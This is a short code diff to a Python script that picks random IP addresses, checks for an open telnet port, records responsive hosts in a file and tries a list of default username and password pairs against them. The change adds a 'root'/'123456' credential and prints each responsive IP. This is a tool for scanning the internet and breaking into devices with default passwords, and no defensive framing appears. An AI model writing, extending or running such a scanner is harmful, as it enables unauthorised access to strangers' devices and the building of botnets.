@@ -65,6 +65,7 @@ def check_telnet(host: str, port: int = 23, timeout: float = 3.0) -> bool:
 
 credentials = {
     "admin": "admin",
+    "root": "123456",
     "admin_2": "123456",
     "admin_3": "password",
     "admin_4": "admin123",
@@ -81,7 +82,7 @@ def main():
     ip = generer_ip()
     result = check_telnet(ip)
     if result:
-        print(result)
+        print(result, ip)
         with open("hey.txt", "a") as f:
             f.write(f"{ip}\n")
         for username in credentials:
